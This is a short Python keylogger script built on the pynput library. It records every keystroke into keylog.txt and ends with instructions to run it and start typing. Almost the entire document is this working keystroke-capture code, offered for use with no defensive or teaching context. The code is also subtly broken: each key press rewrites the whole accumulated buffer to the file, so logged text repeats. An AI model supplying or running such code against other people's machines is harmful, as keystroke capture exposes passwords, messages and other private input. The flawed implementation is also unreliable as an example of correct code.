import pynput.keyboard as keyboard

import threading

import time


class Keylogger:

    def __init__(self, filename='keylog.txt'):

        self.filename = filename

        self.keylog = ""


    def record_key(self, key):

        self.keylog += str(key)

        with open(self.filename, 'a') as f:

            f.write(self.keylog)


    def on_press(self, key):

        try:

            self.record_key(key)

        except AttributeError:

            self.record_key(' ')


    def start_logging(self):

        listener = keyboard.Listener(

            on_press=self.on_press)

        listener.start()


        return listener


if __name__ == '__main__':

    keylogger = Keylogger()

    listener = keylogger.start_logging()

    print('Press ' + 'Ctrl/Cmd' + ' + C to stop.')


    while True:

        try:

            listener.join(1)

        except KeyboardInterrupt:

            break

```


To use this script, run it on your computer and start typing. The script will record all the keystrokes and save them in a file called `keylog.txt`. To stop the script, press 'Ctrl/Cmd' + 'C'.


